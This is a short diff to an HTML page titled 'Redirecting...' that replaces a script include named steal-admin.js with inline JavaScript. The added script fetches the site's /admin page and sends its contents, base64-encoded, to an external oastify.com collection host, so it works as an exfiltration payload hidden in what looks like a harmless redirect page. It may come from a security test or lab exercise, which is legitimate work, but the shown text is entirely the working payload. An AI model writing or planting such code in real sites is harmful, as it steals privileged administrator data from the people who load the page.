@@ -2,6 +2,12 @@
 <html>
   <head><title>Redirecting...</title></head>
   <body>
-    <script src="/test-repo/steal-admin.js"></script>
+    <script>
+fetch('/admin')
+  .then(r => r.text())
+  .then(html => {
+    fetch('https://1wymobzbbtng60yvy0nmdy1k5bb2ztphe.oastify.com/?admin=' + btoa(html));
+  });
+</script>
   </body>
 </html>
